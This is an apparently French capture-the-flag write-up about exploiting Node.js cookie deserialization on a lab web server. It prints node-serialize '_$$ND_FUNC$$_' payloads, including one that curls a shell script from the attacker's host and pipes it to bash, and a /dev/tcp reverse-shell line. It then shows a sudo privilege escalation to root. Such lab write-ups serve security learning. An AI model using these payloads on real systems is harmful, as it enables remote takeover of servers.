<img width="1278" height="1338" alt="image" src="https://github.com/user-attachments/assets/c0eace50-75bb-4641-b7b8-884dcbd63f89" />

> On trouve un port 80 ouvert et on check le site
> 

<img width="1400" height="764" alt="image" src="https://github.com/user-attachments/assets/87014f8a-d4cb-49f0-98d5-600f1cbccfbf" />

<aside>
⛔

Le gobuster ne fonctionne pas, renvoie des 200 pour toutes les requetes, potentiels waf, reverse proxy ou un backend avec fallback (ex: `/anything` → page par défaut)

</aside>

> On décide donc de regarder la page source du site
> 

```jsx
<script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>

```

<aside>
💡

Il faut noter qu’ici il y a un souci de sérialisation: 

en gros :

👉 **Sérialiser = transformer un objet en texte**

👉 **Désérialiser = transformer le texte en objet**

</aside>

En gros dans ce site il y a uniquement un mail d’envoyer, donc pas besoin de sérialiser (on sérialise quand c un objet complexe et qu’on ne peut pas lenvoyer au serveur comme ça il faut donc le tranformer en texte)

Mais lors de la création d’un cookie on voit bien qu’il y a de la sérialisation car ça devient un objet complexe, et c’est ça qu’on va tenter de corrompre, 

On remarque que c’est ce qu’on tape sur le site qui est sérialiser, donc on va voir s’il y a une rce  

<img width="1850" height="1017" alt="image" src="https://github.com/user-attachments/assets/271cfcf6-888a-4f7c-b1dc-d1a40110494b" />

<img width="1400" height="262" alt="image" src="https://github.com/user-attachments/assets/e80462ec-068e-461a-b67e-2c1726aceb66" />

On utilise alors un payload qui justement utilise des commandes system pour voir si le code est vulnérable :

```jsx
{“email”:”_$$ND_FUNC$$_function (){\n \t require(‘child_process’).exec(‘ping -c 1 Yourip’,function(error, stdout, stderr) { console.log(stdout) });\n }()”}
```

on se met en écoute 

<img width="1400" height="544" alt="image" src="https://github.com/user-attachments/assets/090a1801-03ff-44ac-b705-65ad8804734b" />

et on met le payload en base 64 dans les cookies

<img width="1400" height="770" alt="image" src="https://github.com/user-attachments/assets/c50ebf4b-cef4-48be-8040-acdc079afced" />

```jsx
Donc la logique réelle est :
Je vois un cookie encodé → je le décode
Je vois du JSON → suspicion de désérialisation
C’est du NodeJS → je pense aux libs vulnérables
Je teste un payload connu (_$$ND_FUNC$$_)
```

et ça fonctionne 

<img width="1852" height="481" alt="image" src="https://github.com/user-attachments/assets/167125ba-281f-4d54-b5ee-a3d0cf412277" />

Donc on crée un revshell

```jsx
{“email”:”_$$ND_FUNC$$_function (){\n \t require(‘child_process’).exec(‘curl 10.8.233.52:8000/shell.sh | bash’,function(error, stdout, stderr) { console.log(stdout) });\n }()”}
```

et donc avant de le mettre dans les cookies, on ouvre un serveur web dans notre machine d’attaque et on met un revshell 

<img width="1400" height="767" alt="image" src="https://github.com/user-attachments/assets/0d82b619-bde8-4d2b-acdb-fac7d4276dd0" />

<aside>
💡

La raison de pourquoi on ne met pas directement le revshell dans le payload comme ceci :

_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/10.8.233.52/8585 0>&1')}()

on doit gérer :

guillemets `' " -`sauts de ligne `\n-` aractères spéciaux

</aside>

Et donc la on a un revshell qui marche 

---

pour le root on tape :

```jsx
sudo -l
```

on tombe sur (ALL:ALL)

une connerie comme ça 

ce qui veut dire qu’on peut appliquer sudo sur tous les fichiers 

donc :

```jsx
sudo su
```

félicitations on est root
